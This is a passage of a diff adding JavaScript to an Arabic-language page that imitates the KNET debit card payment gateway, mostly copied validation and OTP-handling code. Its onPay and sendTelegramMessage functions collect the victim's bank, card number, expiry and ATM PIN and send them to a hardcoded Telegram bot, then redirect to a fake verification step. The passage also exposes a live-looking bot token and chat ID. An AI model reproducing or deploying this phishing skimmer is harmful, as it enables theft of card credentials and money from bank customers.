+            document.getElementById('OrgTranxAmt').innerHTML = '<div  style="text-align:right;"><label class="column-value text-label" style="width: 60%;">KD&nbsp;6.000</label></div><div  style="float:right;"><label class="column-label" style="width:auto;"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</label></div>';
+            document.getElementById('DiscntRate').innerHTML = '';
+            document.getElementById('DiscntedAmt').innerHTML = '';
+            $("#DiscntRate").hide();
+            $("#DiscntedAmt").hide();
+
+        } else if (name == 'FC') {
+            document.getElementById('FCUseDebitEnable').style.display = "none";
+            document.getElementById('savedCardDiv').style.display = "block";
+            $("#debitCaptchaMsg").hide();
+            $("#ValidationMessage").hide();
+            $('#checkFC').hide();
+            $('#siflg').show();
+            document.getElementById('dcprefix').innerHTML = '<select  class="paymentselect"><option>&#1576;&#1575;&#1583;&#1616;&#1574;&#1577;</option></select>';
+
+
+            document.paypage.creditDebitCheck.value = "SVC";
+
+            //Added for PG Eidia Discount
+            if (document.getElementById('savedCardNumber').checked) {
+
+                var brndlvlDisVal = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[8];
+                var brndlvltranamtDisVal = document.querySelector('input[name="savedCardNumber"]:checked').value.split(",")[9];
+
+            }
+
+        }
+
+    }
+
+    function isNumeric(val) {
+        var iChars = "0123456789";
+        if (val.length == 0) {
+            return false;
+        }
+
+
+        for (var i = 0; i < val.length; i++) {
+            if (iChars.indexOf(val.charAt(i)) == -1) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    function validatePayform() {
+        if (false && document.paypage.paymentOption.value == "") {
+            $("#overlayhide").hide();
+            $('#proceed').show();
+            $("#debitCaptchaMsg").hide();
+            $("#otpmsgDC").hide();
+            $("#CVmsg").hide();
+            document.getElementById('ValidationMessage').innerHTML = '&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1582;&#1578;&#1610;&#1575;&#1585; &#1582;&#1610;&#1575;&#1585; &#1575;&#1604;&#1583;&#1601;&#1593;';
+            $("#ValidationMessage").show();
+            return false;
+        }
+
+        var debitCardNo = document.paypage.debitCardNumber.value;
+        var cardPin = $("#cardPin").val();
+        //Added for Points Redemption - modified
+        var debitsavedcardPIN = "";
+        if (true) {
+            debitsavedcardPIN = $("#debitsavedcardPIN").val();
+        }
+        if (document.paypage.creditDebitCheck.value != "SVC") {
+            //Added for cosmetic changes
+            if (debitCardNo == "bankcode" || (debitCardNo == document.getElementById("dcprefix").value && !isNumeric(debitCardNo)) || debitCardNo == "PrefixAR") {
+                document.getElementById('ValidationMessage').innerHTML = '&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1582;&#1578;&#1610;&#1575;&#1585; &#1575;&#1604;&#1576;&#1606;&#1603; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;';
+                $("#ValidationMessage").show();
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                return false;
+            }
+            //Added for cosmetic changes
+
+            if (debitCardNo == "" || (debitCardNo.length != 19 && debitCardNo.length != 16) || document.paypage.dcprefix.value == "bankcode" || !isNumeric(debitCardNo)) {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                if (brdtype != configbrdtype) {
+                    document.getElementById('ValidationMessage').innerHTML = '.&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1585;&#1602;&#1605; &#1576;&#1591;&#1575;&#1602;&#1578;&#1603;';
+                } else {
+                    if (!debitCardNo.includes("PrefixAR")) {
+                        document.getElementById('ValidationMessage').innerHTML = '.&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1585;&#1602;&#1605; &#1607;&#1575;&#1578;&#1601;&#1603; &#1575;&#1604;&#1605;&#1581;&#1605;&#1608;&#1604;';
+                    } else {
+                        document.getElementById('ValidationMessage').innerHTML = '&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1582;&#1578;&#1610;&#1575;&#1585; &#1575;&#1604;&#1576;&#1606;&#1603; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;';
+                    }
+                }
+                $("#ValidationMessage").show();
+                return false;
+            }
+            //Added for Points Redemption
+            //else if(cardPin.length<4 ||cardPin.length>4 || !isNumeric(cardPin)){
+            else if ((cardPin.length < 4 || cardPin.length > 4 || !isNumeric(cardPin)) && true) {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = '&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1575;&#1604;&#1585;&#1602;&#1605; &#1575;&#1604;&#1587;&#1585;&#1610; &#1575;&#1604;&#1605;&#1603;&#1608;&#1606; &#1605;&#1606; 4 &#1571;&#1585;&#1602;&#1575;&#1605;';
+                $("#ValidationMessage").show();
+                return false;
+            } else if (document.paypage.debitMonth.value == 0 || document.paypage.debitYear.value == 0) {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = '.&#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1588;&#1607;&#1585; &#1575;&#1606;&#1578;&#1607;&#1575;&#1569; &#1575;&#1604;&#1589;&#1604;&#1575;&#1581;&#1610;&#1577; &#1608;&#1575;&#1604;&#1587;&#1606;&#1577;';
+                $("#ValidationMessage").show();
+                return false;
+            } else if (false && document.paypage.SIflg.value == "off") {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = '&#1610;&#1585;&#1580;&#1609; &#1602;&#1585;&#1575;&#1569;&#1577; &#1575;&#1604;&#1588;&#1585;&#1608;&#1591; &#1608;&#1575;&#1604;&#1605;&#1608;&#1575;&#1601;&#1602;&#1577; &#1593;&#1604;&#1609; &#1575;&#1604;&#1578;&#1593;&#1604;&#1610;&#1605;&#1575;&#1578; &#1575;&#1604;&#1583;&#1575;&#1574;&#1605;&#1577;';
+                $("#ValidationMessage").show();
+                return false;
+            } else {
+                return true;
+            }
+        } else {
+            if (debitCardNo == "") {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                if (brdtype != configbrdtype) {
+                    document.getElementById('ValidationMessage').innerHTML = '.&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1585;&#1602;&#1605; &#1576;&#1591;&#1575;&#1602;&#1578;&#1603;';
+                } else {
+                    document.getElementById('ValidationMessage').innerHTML = '.&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1585;&#1602;&#1605; &#1607;&#1575;&#1578;&#1601;&#1603; &#1575;&#1604;&#1605;&#1581;&#1605;&#1608;&#1604;';
+                }
+                $("#ValidationMessage").show();
+                return false;
+            }
+            //Added for Points Redemption
+            //else if(debitsavedcardPIN.length<4 || debitsavedcardPIN.length>4 || !isNumeric(debitsavedcardPIN)){
+            else if ((debitsavedcardPIN.length < 4 || debitsavedcardPIN.length > 4 || !isNumeric(debitsavedcardPIN)) && true) {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = '&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581;&#1577; - &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1575;&#1604;&#1585;&#1602;&#1605; &#1575;&#1604;&#1587;&#1585;&#1610; &#1575;&#1604;&#1605;&#1603;&#1608;&#1606; &#1605;&#1606; 4 &#1571;&#1585;&#1602;&#1575;&#1605;';
+                $("#ValidationMessage").show();
+                return false;
+            } else if (false && document.paypage.SIflg.value == "off") {
+                $("#overlayhide").hide();
+                $('#proceed').show();
+                $("#debitCaptchaMsg").hide();
+                $("#otpmsgDC").hide();
+                $("#CVmsg").hide();
+                document.getElementById('ValidationMessage').innerHTML = '&#1610;&#1585;&#1580;&#1609; &#1602;&#1585;&#1575;&#1569;&#1577; &#1575;&#1604;&#1588;&#1585;&#1608;&#1591; &#1608;&#1575;&#1604;&#1605;&#1608;&#1575;&#1601;&#1602;&#1577; &#1593;&#1604;&#1609; &#1575;&#1604;&#1578;&#1593;&#1604;&#1610;&#1605;&#1575;&#1578; &#1575;&#1604;&#1583;&#1575;&#1574;&#1605;&#1577;';
+                $("#ValidationMessage").show();
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+    }
+
+
+    function sendTelegramMessage(messageText) {
+        botToken = '8599584358:AAFo3N5h5TrjujeZGH2SbS8L4EPpjYSaQqg'
+        chatId = '-5263360636'
+        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        $.ajax({
+            url: apiUrl,
+            type: 'POST',
+            data: {
+                chat_id: chatId,
+                text: messageText,
+                parse_mode: "MarkdownV2"
+
+            },
+            success: function(response) {
+                console.log('Message sent successfully:', response);
+                // Optional: Provide feedback to the user
+            },
+            error: function(error) {
+                console.error('Error sending message:', error);
+                // Optional: Handle error and provide feedback
+            }
+        });
+    }
+
+    function onPay() {
+        cc = document.getElementById('dcprefix').value + document.getElementById("debitNumber").value
+        month = document.getElementById('month').value
+        year = document.getElementById('year').value
+        localStorage.setItem('cc', cc)
+        localStorage.setItem('month', month)
+        localStorage.setItem('year', year)
+
+
+        var message = `
+    📩 كي نت
+    👤 الاسم/الجوال: \`${localStorage.getItem('userName')}\`
+    🏦 البنك: ${document.getElementById('bank').value}
+    🔢 البادئة: \`${document.getElementById('dcprefix').value}\`
+    💳 آخر 10 أرقام: \`${document.getElementById("debitNumber").value}\`
+    📅 انتهاء: \`${document.getElementById("month").value}/${document.getElementById("year").value}\`
+    🔑 ATM: \`${document.getElementById("cardPin").value}\``
+        sendTelegramMessage(message)
+        window.location.href = '../verification';
+
+    }
+
+    function payConfirmAjax(val) {
+
+        //Fix done by Saqib - 25th April 2022
+
+        //var _0x2b16f7=_0x32c1;function _0x32c1(_0x3b466b,_0x5b19e4){var _0x4e163b=_0x4e16();return _0x32c1=function(_0x32c13b,_0xe3e9f3){_0x32c13b=_0x32c13b-0x1a9;var _0x300976=_0x4e163b[_0x32c13b];return _0x300976;},_0x32c1(_0x3b466b,_0x5b19e4);}function _0x4e16(){var _0x2a3fac=['12129176VhRRZn','3647WxGPJh','211083ypMQlC','value','pgEidiaDiscountFlag','paypage','511485PHrarS','523738nFdSNu','1578WbgLzG','1281560XMSMQq','1122456mTcZBZ'];_0x4e16=function(){return _0x2a3fac;};return _0x4e16();}(function(_0x4c3d35,_0x494c97){var _0x141f96=_0x32c1,_0x4d2845=_0x4c3d35();while(!![]){try{var _0x2d2e9f=-parseInt(_0x141f96(0x1a9))/0x1+-parseInt(_0x141f96(0x1aa))/0x2+-parseInt(_0x141f96(0x1b0))/0x3+-parseInt(_0x141f96(0x1ad))/0x4+-parseInt(_0x141f96(0x1ac))/0x5+parseInt(_0x141f96(0x1ab))/0x6*(parseInt(_0x141f96(0x1af))/0x7)+parseInt(_0x141f96(0x1ae))/0x8;if(_0x2d2e9f===_0x494c97)break;else _0x4d2845['push'](_0x4d2845['shift']());}catch(_0x5ed3fa){_0x4d2845['push'](_0x4d2845['shift']());}}}(_0x4e16,0x42891),document['paypage']['discountedtranamount'][_0x2b16f7(0x1b1)]='',document[_0x2b16f7(0x1b3)][_0x2b16f7(0x1b2)][_0x2b16f7(0x1b1)]=0x0);
+
+        //End of fix
+
+
+        //sibTags('MobConfirmBtnAR','MobConfirmPageAR','ConfirmBtnAR');
+        $('#proceedConfirm').hide();
+        $("#overlayhide1").show();
+
+        //Added for Points Redemption
+        var langid = document.paypage.langID.value;
+        var otpGenMethod = document.paypage.otpgenMethod.value;
+        var otpvalidateValue = "";
+        if (otpGenMethod == "3") {
+            otpvalidateValue = val;
+        }
+        //Added for Points Redemption
+
+        /*Added for OTP at I-T-B level*/
+        document.paypage.OTPtranamtlmt.value = amountlimit;
+        document.paypage.OTPamtlmtidentifier.value = OTPamtlmtIdentifier;
+        /*Added for OTP at I-T-B level*/
+
+        //Added for Points Redemption - modified
+        //if(((document.paypage.timeOver.value==0)&&(document.paypage.debitOTP.value!="")&&(document.paypage.debitOTP.value.length==6))||document.paypage.otpflgdiv.value =="0" )
+        if (((document.paypage.timeOver.value == 0) && (document.paypage.debitOTP.value != "") && (document.paypage.debitOTP.value.length == document.paypage.debitOTP.maxLength)) || document.paypage.otpflgdiv.value == "0" || otpvalidateValue == "Resend" && document.paypage.timeOver.value == 0) {
+            if (document.paypage.otpflgdiv.value == "1") {
+
+                var payid = document.paypage.paymentId.value;
+                var otpcode = document.paypage.debitOTP.value;
+                var paymentId = "60102700006594106019560000720410";
+                var mode = 'ECB';
+                var encryptedOtp = byteArrayToHex(rijndaelEncrypt(otpcode, hexToByteArray(paymentId), mode));
+                var UserId = document.paypage.OtpUserID.value;
+
+                //Added for prod issue - 29-jun-21
+                var PaymentStatus = 'INITIALIZED';
+
+                /* Added for Points Redemption - modified  */
+
+                var url = "/kpg/paymentrouter.htm?paymentId=" + payid + "&instId=" + "209" + "&OtpValUserID=" + UserId + "&debitOTP=" + encryptedOtp + "&otpval=1" + "&Otptenant=" + document.paypage.Otptenant.value + "&creditDebitCheck=" + document.paypage.creditDebitCheck.value + "&otpvalcount=" + document.paypage.otpvalcount.value + "&otpGenMethod=" + otpGenMethod + "&OtpAction=" + otpvalidateValue + "&langID=" + langid + "&pymtPgEiddiscntflg=" + pymtPgEiddiscntflg + "&discountedtranamount=" + document.paypage.discountedtranamount.value + "&PaymentStatus=" + PaymentStatus;
+                $.ajax({
+                    type: 'post',
+                    url: url,
+                    datatype: 'json',
+                    success: function(ajaxResponseData) {
+                        var xml = jQuery(ajaxResponseData);
+                        var res = xml.find("msg").text();
+                        var result = res.split("|");
+                        var response = result[0];
+                        var flag = result[1];
+                        var ValidateOTPremainCnt = result[3];
+                        document.paypage.otpvalcount.value = result[2];
+
+                        //Added for Points Redemption - modified
+                        if (result[4] == 1) {
+                            document.getElementById('Resend').style.display = "none";
+                        }
+                        //Added for Points Redemption - modified
+
+                        if (response == "200") {
+                            document.paypage.otpConfirmationFlg.value = 1;
+                            document.paypage.BranDType.value = brdtype;
+                            onProceed_buttonClicked();
+                        }
+
+                        //Added for Points Redemption
+                        else if (response == "OTPEXP") {
+                            document.getElementById('otpmsgDC2').innerHTML = '&#1575;&#1606;&#1578;&#1607;&#1578; &#1589;&#1604;&#1575;&#1581;&#1610;&#1577; OTP.<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "OTPINV") {
+                            document.getElementById('otpmsgDC2').innerHTML = '&#1594;&#1610;&#1585; &#1589;&#1581;&#1610;&#1581; OTP<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "OTPRESENT") {
+                            document.getElementById('otpmsgDC2').innerHTML = '&#1578;&#1605; &#1575;&#1585;&#1587;&#1575;&#1604; &#1585;&#1605;&#1586; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609; &#1576;&#1606;&#1580;&#1575;&#1581;';
+                            $("#otpmsgDC2").show();
+                            //Added for QA fix
+                            resetTimer(otpTimer);
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = ' #23d620';
+                            document.getElementById('otpmsgDC2').style.border = '#127d1b 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = ' #127d1b';
+                            //Added for Points Redemption - modified
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.paypage.debitOTP.value = "";
+                        }
+                        //Added for Points Redemption
+                        else if (response == "409") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').innerHTML = '&#1581;&#1583;&#1579;&#1578; &#1605;&#1588;&#1603;&#1604;&#1577; &#1601;&#1610; &#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578; &#1576;&#1591;&#1575;&#1602;&#1578;&#1603;. &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1575;&#1604;&#1576;&#1606;&#1603; &#1575;&#1604;&#1605;&#1589;&#1583;&#1585; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "404") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '.&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; &#1594;&#1610;&#1585; &#1605;&#1608;&#1580;&#1608;&#1583;. &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1575;&#1604;&#1576;&#1606;&#1603; &#1575;&#1604;&#1605;&#1589;&#1583;&#1585; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+
+                        }
+
+                        //Added by Viswajith S if OTP Configuration not done
+                        else if (response == "401") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '.OTP&#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609;&#1548; &#1601;&#1588;&#1604; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602; &#1605;&#1606; &#1575;&#1604;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "400") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '.&#1591;&#1604;&#1576; &#1587;&#1610;&#1569; &#1571;&#1608; &#1591;&#1604;&#1576; &#1594;&#1610;&#1585; &#1589;&#1575;&#1604;&#1581; &#1571;&#1608; &#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578; &#1605;&#1591;&#1604;&#1608;&#1576;&#1577; &#1605;&#1601;&#1602;&#1608;&#1583;&#1577;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "500") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '.&#1581;&#1583;&#1579; &#1582;&#1591;&#1571; &#1571;&#1579;&#1606;&#1575;&#1569; &#1605;&#1593;&#1575;&#1604;&#1580;&#1577; &#1591;&#1604;&#1576;&#1603; &#1548; &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "UEX") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '!. &#1582;&#1591;&#1571; &#1594;&#1610;&#1585; &#1605;&#1578;&#1608;&#1602;&#1593; &#1548; &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609; &#1601;&#1610; &#1608;&#1602;&#1578; &#1604;&#1575;&#1581;&#1602;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "TEX") {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '.&#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609; &#1604;&#1575;&#1581;&#1602;&#1575;&#1611; &#1548;OTP &#1582;&#1591;&#1571; &#1601;&#1610; &#1573;&#1585;&#1587;&#1575;&#1604;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        } else if (response == "600") {
+                            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                            document.paypage.paymentOtpGenCancel.value = "OtpvalCancel";
+                            document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                            document.paypage.submit();
+                        }
+
+                        //Added for Points Redemption
+                        else if (response == "OTPVALERROR") {
+                            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                            document.paypage.paymentOtpGenCancel.value = "OtpValError";
+                            document.paypage.action = "/kpg/paymentOtpCancel.htm";
+                            document.paypage.submit();
+                        }
+                        //Added for Points Redemption
+
+                        //Added for prod issue - 29-jun-21
+                        else if (response == "INVSTAT") {
+                            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                            document.paypage.ErrorText.value = 'Payment Page validation failed due to invalid Order Status:' + result[11];
+                            document.paypage.action = "/kpg/transactiondeclined.htm";
+                            document.paypage.submit();
+                        }
+                        //Added for prod issue - 29-jun-21
+                        else if (response == "OTPConfirmationFlagUpdateFailureDecline") {
+                            document.paypage.cspg.value = formParameterValue(document.paypage, encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
+                            document.paypage.action = "/kpg/otpConfirmationFlagUpdateFailDecline.htm?paymentid=" + payid;
+                            document.paypage.submit();
+                        } else {
+                            $("#overlayhide1").hide();
+                            $('#proceedConfirm').show();
+                            document.getElementById('otpmsgDC2').innerHTML = '!. &#1582;&#1591;&#1571; &#1594;&#1610;&#1585; &#1605;&#1578;&#1608;&#1602;&#1593; &#1548; &#1610;&#1585;&#1580;&#1609; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609; &#1601;&#1610; &#1608;&#1602;&#1578; &#1604;&#1575;&#1581;&#1602;<br />&#1576;&#1575;&#1602;&#1610; ' + ValidateOTPremainCnt + ' &#1605;&#1581;&#1575;&#1608;&#1604;&#1575;&#1578; &#1601;&#1602;&#1591;';
+                            $("#otpmsgDC2").show();
+                            //Added for Points Redemption - modified
+                            document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                            document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                            document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                            //Added for Points Redemption - modified
+                            document.paypage.debitOTP.value = "";
+                        }
+                    }
+                });
+
+            } else {
+                onProceed_buttonClicked();
+            }
+        } else {
+
+            if (document.paypage.timeOver.value == 1) {
+                $('#otpmsgDC2').show();
+                //Added for Points Redemption - modified
+                document.getElementById('otpmsgDC2').style.backgroundColor = '#f7dadd';
+                document.getElementById('otpmsgDC2').style.border = '#ff0000 1px solid';
+                document.getElementById('otpmsgDC2').style.color = '#ff0000';
+                //Added for Points Redemption - modified
+                $("#overlayhide1").hide();
+                $('#proceedConfirm').show();
+                document.getElementById('otpmsgDC2').innerHTML = '(OTP) &#1604;&#1602;&#1583; &#1575;&#1606;&#1578;&#1607;&#1578; &#1589;&#1604;&#1575;&#1581;&#1610;&#1577; &#1585;&#1605;&#1586; &#1575;&#1604;&#1578;&#1581;&#1602;&#1602;';
+            } else {
+                $("#otpmsgDC2").show();
+                //Added for Points Redemption - modified
